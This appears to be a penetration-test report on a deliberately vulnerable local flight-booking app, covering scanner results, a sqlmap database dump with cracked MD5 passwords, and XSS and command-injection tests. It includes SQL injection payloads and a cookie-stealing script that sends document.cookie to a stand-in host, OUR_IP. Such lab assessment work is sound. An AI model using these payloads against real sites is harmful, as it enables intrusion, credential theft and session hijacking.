
# Flybook
## Manual Code Review:
### Web:

The password seems to be hard-coded into the login form.

![](./attachments/Pasted%20image%2020220513160909.png)

We can get the password by changing `type` to `show`, or we can simply read it from the `value` field.

User:pass `alice@its.dk:alice-1234`

![](./attachments/Pasted%20image%2020220513161136.png)

---
In the bottom of the `/book.html` page, there is a footer which has been commented out:

![](./attachments/Pasted%20image%2020220514151221.png)

```html
	<!--<footer class="pt-4 my-md-5 pt-md-5 border-top">-->
    <!--<div class="row">-->
    <!--<div class="col-12 col-md">-->
    <!--<i class="fas fa-plane "></i> FlyBook-->
    <!--<small class="d-block mb-3 text-muted">© 2017-2018</small>-->
    <!--</div>-->
    <!--<div class="col-6 col-md">-->
    <!--<h5>Features</h5>-->
    <!--<ul class="list-unstyled text-small">-->
    <!--<li><a class="text-muted" href="#">Cool stuff</a></li>-->
    <!--<li><a class="text-muted" href="#">Random feature</a></li>-->
    <!--<li><a class="text-muted" href="#">Team feature</a></li>-->
    <!--<li><a class="text-muted" href="#">Stuff for developers</a></li>-->
    <!--<li><a class="text-muted" href="#">Another one</a></li>-->
    <!--<li><a class="text-muted" href="#">Last time</a></li>-->
    <!--</ul>-->
    <!--</div>-->
    <!--<div class="col-6 col-md">-->
    <!--<h5>Resources</h5>-->
    <!--<ul class="list-unstyled text-small">-->
    <!--<li><a class="text-muted" href="#">Resource</a></li>-->
    <!--<li><a class="text-muted" href="#">Resource name</a></li>-->
    <!--<li><a class="text-muted" href="#">Another resource</a></li>-->
    <!--<li><a class="text-muted" href="#">Final resource</a></li>-->
    <!--</ul>-->
    <!--</div>-->
    <!--<div class="col-6 col-md">-->
    <!--<h5>About</h5>-->
    <!--<ul class="list-unstyled text-small">-->
    <!--<li><a class="text-muted" href="#">Team</a></li>-->
    <!--<li><a class="text-muted" href="#">Locations</a></li>-->
    <!--<li><a class="text-muted" href="#">Privacy</a></li>-->
    <!--<li><a class="text-muted" href="#">Terms</a></li>-->
    <!--</ul>-->

    <!--</div>-->
    <!--</div>-->
    <!--</footer>-->
```

### Desktop:
We looked through the java code manually, but were not able to determine any vulnerabilities.

Though we did notice that it is build with the secure MVC (Model-View-Controller) design pattern.

```bash
┌──(kali㉿kali)-[~/…/desktop-app/src/dk/kea]
└─$ tree
.
├── FindFlightController.java
├── LoginController.java
├── Main.java
├── model
│   ├── Airplane.java
│   ├── Airport.java
│   ├── Booking.java
│   ├── Flight.java
│   ├── Passenger.java
│   └── RespFromAPI.java
├── MyUtil.java
└── view
    ├── find_flight.css
    ├── find_flight.fxml
    ├── find_flight_v2.fxml
    └── login.fxml

2 directories, 14 files
```

---
## ZAP Scanner
Mapping the site:
![](./attachments/Pasted%20image%2020220513150340.png)

### Vulnerabilities:
#### High alert:
![](./attachments/Pasted%20image%2020220513164306.png)

SQL Injection:
```
URL: 	
http://localhost:8000/api/API.php?API_KEY=Flight+booker+1.2+plus+edition&action=get&items=airport&search=%22+AND+%221%22%3D%221%22+--+
Description: 	
SQL injection may be possible.
Risk: 	
High
Attack: 	
" AND "1"="1" --
CWE Id: 	
89
Other Info: 	
The page results were successfully manipulated using the boolean conditions [" AND "1"="1" -- ] and [" AND "1"="2" -- ] The parameter value being modified was NOT stripped from the HTML output for the purposes of the comparison Data was returned for the original parameter. The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter
Solution: 	
Do not trust client side input, even if there is client side validation in place. In general, type check all data on the server side. If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?' If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries. If database Stored Procedures can be used, use them. Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality! Do not create dynamic SQL queries using simple string concatenation. Escape all data received from the client. Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input. Apply the principle of least privilege by using the least privileged database user possible. In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact. Grant the minimum database access that is necessary for the application.
Reference: 	
* https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

```

It is dumping the `airports` database:

![](./attachments/Pasted%20image%2020220513164553.png)

During manual testing, we reach this very simple payload.

Payload: `";`

![](./attachments/Pasted%20image%2020220513172151.png)

#### Medium alerts:
![](./attachments/Pasted%20image%2020220514145412.png)

Absence of Anti-CSRF Tokens:

```
URL: 	
http://localhost:8000/
Description: 	
No Anti-CSRF tokens were found in a HTML submission form. A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf. CSRF attacks are effective in a number of situations, including: * The victim has an active session on the target site. * The victim is authenticated via HTTP auth on the target site. * The victim is on the same local network as the target site. CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.
Risk: 	
Medium
Evidence: 	
<form class="form-signin">
CWE Id: 	
352
Other Info: 	
No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "inputEmail" "inputPassword" ].
Solution: 	
Architecture and Design Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP CSRFGuard. Phase: Implementation Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script. Phase: Architecture and Design Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330). Note that this can be bypassed using XSS. Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation. Note that this can be bypassed using XSS. Use the ESAPI Session Management control. This control includes a component for CSRF. Do not use the GET method for any request that triggers a state change. Phase: Implementation Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.
Reference: 	
* http://projects.webappsec.org/Cross-Site-Request-Forgery
* http://cwe.mitre.org/data/definitions/352.html
```
 
![](./attachments/Pasted%20image%2020220514145438.png)

Content Security Policy (CSP) Header Not Set:

```
URL: 	
http://localhost:8000/
Description: 	
Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
Risk: 	
Medium 	 	
CWE Id: 	
693	
Solution: 	
Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header, to achieve optimal browser support: "Content-Security-Policy" for Chrome 25+, Firefox 23+ and Safari 7+, "X-Content-Security-Policy" for Firefox 4.0+ and Internet Explorer 10+, and "X-WebKit-CSP" for Chrome 14+ and Safari 6+.
Reference: 	
* https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy
* https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
* http://www.w3.org/TR/CSP/
* http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html
* http://www.html5rocks.com/en/tutorials/security/content-security-policy/
* http://caniuse.com/#feat=contentsecuritypolicy
* http://content-security-policy.com/
```

![](./attachments/Pasted%20image%2020220514145528.png)

Missing Anti-clickjacking Header:

```
URL: 	
http://localhost:8000/
Description: 	
The response does not include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options to protect against 'ClickJacking' attacks.
Risk: 	
Medium
CWE Id: 	
1021
Solution: 	
Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app. If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.
Reference: 	
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
```

#### Low alerts:
Three additional low level vulnerabilities:

![](./attachments/Pasted%20image%2020220514150940.png)

---
### SQL Map:
Since we found an SQL injection on the `booking.html` page, we will run `sqlmap` to enumerate and hopefully dump all the databases.

```bash
┌──(kali㉿kali)-[~/flybook]
└─$ sqlmap -u 'http://localhost:8000/api/API.php?API_KEY=Flight%20booker%201.2%20plus%20edition&action=get&items=flights&date=2018-05-01&from=%202341&to=%201' --dump    
        ___
       __H__                                                                                                                                       
 ___ ___[.]_____ ___ ___  {1.6.5#stable}                                                                                                           
|_ -| . ["]     | .'| . |                                                                                                                          
|___|_  [)]_|_|_|__,|  _|                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:28:19 /2022-05-15/

[05:28:19] [INFO] resuming back-end DBMS 'mysql' 
[05:28:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: from (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: API_KEY=Flight booker 1.2 plus edition&action=get&items=flights&date=2018-05-01&from=(SELECT (CASE WHEN (5174=5174) THEN ' 2341' ELSE (SELECT 5215 UNION SELECT 6872) END))&to= 1

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: API_KEY=Flight booker 1.2 plus edition&action=get&items=flights&date=2018-05-01&from= 2341;SELECT SLEEP(5)#&to= 1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: API_KEY=Flight booker 1.2 plus edition&action=get&items=flights&date=2018-05-01&from= 2341 AND (SELECT 6372 FROM (SELECT(SLEEP(5)))seLZ)&to= 1

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: API_KEY=Flight booker 1.2 plus edition&action=get&items=flights&date=2018-05-01&from= 2341 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x74626b5667447a41504241724c736f6b6d6b70494d7a666a6b77657a6463574c684d5863464a4179,0x717a7a7071),NULL,NULL,NULL-- -&to= 1
---
[05:28:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.3.33, Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[05:28:19] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[05:28:19] [INFO] fetching current database
[05:28:19] [INFO] fetching tables for database: 'flybook'
[05:28:20] [INFO] fetching columns for table 'bookings' in database 'flybook'
[05:28:20] [INFO] fetching entries for table 'bookings' in database 'flybook'
Database: flybook
Table: bookings
[10 entries]
+----+--------+--------+-----------+
| id | flight | status | passenger |
+----+--------+--------+-----------+
| 1  | 6      | OK     | 1         |
| 2  | 312    | OK     | 1         |
| 3  | 313    | OK     | 1         |
| 4  | 311    | OK     | 1         |
| 5  | 312    | OK     | 1         |
| 6  | 311    | OK     | 1         |
| 7  | 311    | OK     | 1         |
| 8  | 311    | OK     | 1         |
| 9  | 311    | OK     | 1         |
| 10 | 311    | OK     | 1         |
+----+--------+--------+-----------+

[05:28:20] [INFO] table 'flybook.bookings' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/flybook/bookings.csv'
[05:28:20] [INFO] fetching columns for table 'airplanes' in database 'flybook'
[05:28:20] [INFO] fetching entries for table 'airplanes' in database 'flybook'
Database: flybook
Table: airplanes
[10 entries]
+----+-------------------+-------+-------------------+
| id | model             | seats | airline           |
+----+-------------------+-------+-------------------+
| 1  | Airbus A319       | 250   | KLM               |
| 2  | Airbus A320       | 180   | SAS               |
| 3  | Airbus A321       | 200   | Turkish Airlines  |
| 4  | Boeing 737        | 260   | Norwegian         |
| 5  | Boeing 777        | 350   | Emirates Airlines |
| 6  | Airbus A330       | 140   | Lufthansa         |
| 7  | Embraer E-195     | 130   | LOT               |
| 8  | Bombardier CRJ900 | 200   | Air Canada        |
| 9  | Boeing 767        | 260   | Delta Airlines    |
| 10 | Boeing 757        | 180   | EasyJet           |
+----+-------------------+-------+-------------------+

[05:28:20] [INFO] table 'flybook.airplanes' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/flybook/airplanes.csv'
[05:28:20] [INFO] fetching columns for table 'airports' in database 'flybook'
[05:28:20] [INFO] fetching entries for table 'airports' in database 'flybook'
Database: flybook
Table: airports
[3592 entries]
+------+---------+--------------------------------------------------------------+
| id   | code    | airport                                                      |
+------+---------+--------------------------------------------------------------+
[05:28:20] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 3337 | USK     | Usinsk, Russia                                               |
| 3338 | UIK     | Ust-Ilimsk, Russia                                           |
| 3339 | UKK     | Ust-Kamenogorsk, Kazakhstan                                  |

(...)

| 3590 | OUZ     | Zouerate, Mauritania                                         |
| 3591 | UGU     | Zugapa, Indonesia                                            |
| 3592 | ZRH     | Zurich, Switzerland                                          |
+------+---------+--------------------------------------------------------------+

[05:28:22] [INFO] table 'flybook.airports' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/flybook/airports.csv'
[05:28:22] [INFO] fetching columns for table 'passengers' in database 'flybook'
[05:28:22] [INFO] fetching entries for table 'passengers' in database 'flybook'
[05:28:22] [INFO] recognized possible password hashes in columns 'token, password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: flybook
Table: passengers
[2 entries]
+----+-------+--------------+-----------+----------------------------------+----------------------------------+--------------------+
| id | name  | email        | phone     | token                            | password                         | travel_document_no |
+----+-------+--------------+-----------+----------------------------------+----------------------------------+--------------------+
| 1  | Alice | alice@its.dk | 12782390  | 4292e11c0c184edcdc9f41a4f10468fe | dfd7c8cf918a11426b5e0996636b1229 | PAS-456789         |
| 2  | Bob   | bob@its.dk   | 784512546 | <blank>                          | a12dc5bac0376c86401ffa437cc24ade | ID-4567889         |
+----+-------+--------------+-----------+----------------------------------+----------------------------------+--------------------+

[05:28:31] [INFO] table 'flybook.passengers' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/flybook/passengers.csv'
[05:28:31] [INFO] fetching columns for table 'flights' in database 'flybook'
[05:28:31] [INFO] fetching entries for table 'flights' in database 'flybook'
Database: flybook
Table: flights
[313 entries]
+-----+------+--------+----------+------------+--------------+---------------------+---------------------+
| id  | gate | number | airplane | airport_to | airport_from | date_time_arriv     | date_time_depart    |
+-----+------+--------+----------+------------+--------------+---------------------+---------------------+
[05:28:31] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 58  | O04  | CD2639 | 7        | 548        | 2503         | 2017-11-30 07:36:12 | 2018-12-19 15:36:05 |
| 59  | W17  | JQ0981 | 3        | 1546       | 456          | 2018-02-22 21:23:01 | 2018-12-15 11:27:58 |
| 60  | U50  | LC9033 | 1        | 1561       | 2615         | 2017-09-07 09:24:26 | 2018-10-07 19:25:11 |

(...)

| 311 | A67  | JS1213 | 2        | 110        | 732          | 2018-05-02 23:06:38 | 2018-05-01 08:00:48 |
| 312 | B12  | TA113  | 1        | 110        | 732          | 2018-05-02 23:06:38 | 2018-05-01 08:00:48 |
| 313 | C2   | SAS113 | 4        | 110        | 732          | 2018-05-02 21:09:38 | 2018-05-01 14:00:48 |
+-----+------+--------+----------+------------+--------------+---------------------+---------------------+

[05:28:33] [INFO] table 'flybook.flights' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/flybook/flights.csv'
[05:28:33] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 05:28:33 /2022-05-15/
```

We got all the databases, the `passenger` table is especially interesting.

User:Pass `bob@its.dk:a12dc5bac0376c86401ffa437cc24ade`

It looks like the password is hashed.

We can use `hashid` is try and detect the hash function used.

```bash
┌──(kali㉿kali)-[~]
└─$ hashid a12dc5bac0376c86401ffa437cc24ade
Analyzing 'a12dc5bac0376c86401ffa437cc24ade'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x
```

One of the `MD` hash functions was likely used, and since MD5 is the most common of them, we will go with that one first.

Let's save the hash to a file.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo 'a12dc5bac0376c86401ffa437cc24ade' > hash.txt
```

Now, we can use `john` to crack the password. 

Command: `john --format=raw-md5 -w=list.txt hash.txt`

`--format`: Input is raw MD5.

`-w=`: Use this word list.

`hash.txt`: The hash.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ john --format=raw-md5 -w=list.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 24 needed for performance.
bob-1234         (?)     
1g 0:00:00:00 DONE (2022-05-15 06:55) 100.0g/s 100.0p/s 100.0c/s 100.0C/s bob-1234
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.

Since MD5 is the most common of them,
```

We cracked the password:

User:pass `bob@its.dk:bob-1234`

Passwords are not salted and hashed with the insecure MD5 function.

---
## XXS
XXS Reflections:

There is reflections on the site, delivered with JavaScript.

![](./attachments/Pasted%20image%2020220513165821.png)

XSStrike:

```bash
┌──(kali㉿kali)-[~/XSStrike]
└─$ python xsstrike.py -u "http://localhost:8000/api/API.php?API_KEY=Flight+booker+1.2+plus+edition&action=get&items=airport&search=" 

        XSStrike v3.1.5                                                                              
[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: API_KEY 
[-] No reflection found 
[!] Testing parameter: action 
[-] No reflection found 
[!] Testing parameter: items 
[-] No reflection found 
[!] Testing parameter: search 
[-] No reflection found 
```

Is unable to find any reflections, probably due to them being displayed with JavaScript.

During manual testing of the input fields, we found a way to make XXS reflections that show up in the static HTML page.

Payload: `Haxx,2,3`

![](./attachments/Pasted%20image%2020220514154110.png)

Testing for SQL injection vulnerability:

Payload: `<script>alert(window.origin)</script>,2,3`

![](./attachments/Pasted%20image%2020220514155639.png)

This is just a reflected XSS, but if we can somehow store a malicious payload in the `bookings` database, we might be able to steal a session cookie from an employee at the airline. When he opens the booking table in the backend admin portal, the injected code will be executed and his browser cookie will be sent to us.

This can be done by injecting a payload into the booking request.

Payload: `311<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`

![](./attachments/Pasted%20image%2020220515151948.png)

Sadly we get an error, the database does not accept the input.

---
## Pen-testing login page:
We replay the request with ZAP manual request editor in order to see the responses from the server when the login is correct and incorrect.

Incorrect login:

![](./attachments/Pasted%20image%2020220515103815.png)

Correct login:

![](./attachments/Pasted%20image%2020220515103907.png)

Seemingly no vulnerabilities present. It is not revealing too much information when the password is incorrect.

---

When booking a flight as logged in vs not logged in.

Logged in:

![](./attachments/Pasted%20image%2020220515105819.png)

Not logged in:

![](./attachments/Pasted%20image%2020220515105951.png)

Using OWASP ZAP to Fuzz the login form with Seclists `Generic-SQLi.txt`, similarly reveals no vulnerabilities.

![](./attachments/Pasted%20image%2020220515141726.png)

---
## Command Injection
![](./attachments/Pasted%20image%2020220515143436.png)

Upon visiting the `service.html` page, and grabbing the request with ZAP, we notice that requests are sent continually.

![](./attachments/Pasted%20image%2020220515140141.png)

Looking closer at the request, we discover a Command Injection.

![](./attachments/Pasted%20image%2020220515140520.png)
 
Introducing a space gives us problems.

![](./attachments/Pasted%20image%2020220515143250.png)

Fuzzing the input results in a lot of successful command injections, none of them are executing though. It looks like there is a problem with URL encoding.

![](./attachments/Pasted%20image%2020220515142649.png)

---
## SNYK scanner:
![](./attachments/Pasted%20image%2020220515154623.png)

### Code analysis:

It finds SQL injections.

![](./attachments/Pasted%20image%2020220515155020.png)

And the outdated MD5 hash function.

![](./attachments/Pasted%20image%2020220515155155.png)

---
### Docker:
There are a lot of vulnerabilities here. We assume this is because Apache/PHP/Docker has not been updated for a while.

![](./attachments/Pasted%20image%2020220515154940.png)

![](./attachments/Pasted%20image%2020220515154954.png)

![](./attachments/Pasted%20image%2020220515155006.png)

![](./attachments/Pasted%20image%2020220515155146.png)

---
## Embold scanner:
Scans the `desktop-app` Java files, opposite to the other scanners. 

There are many duplicates in the output.

![](./attachments/Pasted%20image%2020220515155923.png)

Resource leak:

![](./attachments/Pasted%20image%2020220515160045.png)

Generic expression:

![](./attachments/Pasted%20image%2020220515160051.png)

Other CWE's found:

![](./attachments/Pasted%20image%2020220515160101.png)